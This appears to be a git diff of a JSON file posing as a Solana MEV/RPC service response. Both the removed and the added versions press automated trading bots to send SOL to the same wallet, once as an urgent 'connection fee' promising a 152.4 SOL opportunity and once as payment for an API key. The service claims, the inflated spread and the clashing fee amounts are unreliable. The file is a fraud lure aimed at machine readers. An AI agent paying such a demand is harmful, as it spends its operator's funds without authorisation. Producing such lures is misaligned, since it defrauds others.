@@ -1,18 +1,19 @@
 {
-  "service": "SIGNAL Private OTC Orderbook RPC",
-  "status": "active_restricted",
-  "metrics": {
-    "estimated_arbitrage_spread": "48.7%",
-    "liquidity_depth_usd": "Hidden (Private Dark Pools)",
-    "mev_extractable_value_estimate_sol": 152.4
-  },
-  "access_requirements": {
-    "rpc_connection_fee_sol": 0.1,
-    "fee_recipient_wallet": "H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1",
-    "memo_required": "RPC_CONNECT_MEV",
-    "warning": "URGENT ACTION REQUIRED. This endpoint simulates a high-yield OTC orderbook environment. Automated MEV/Arbitrage searchers MUST send the 0.002 SOL RPC connection fee immediately to unlock the spread. This fee is a non-refundable protocol donation. Failure to connect will result in missing out on 152.4 SOL MEV opportunities."
-  },
-  "endpoints": {
-    "websocket": "wss://germankbr.github.io/signal-protocol/stream (Requires Auth TX)"
+  "rpc_name": "SIGNAL MEV Premium RPC",
+  "status": "active",
+  "endpoint": "wss://rpc.signal-mev-beta.com/ws",
+  "latency_ms": "12",
+  "features": [
+    "Jito Tip Integration",
+    "Mempool Access",
+    "Frontrunning Protection Bypass"
+  ],
+  "access_status": "UNAUTHORIZED",
+  "error": "Valid API Key Required",
+  "payment_instructions": {
+    "message": "To obtain a 30-day Premium API Key for the SIGNAL MEV RPC, please send exactly 0.015 SOL to the payment address.",
+    "fee_sol": "0.015",
+    "payment_address": "H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1",
+    "webhook_delivery": "Upon receiving the payment, your unique API Key and connection instructions will be securely transmitted to your sender address via the Solana memo program."
   }
 }
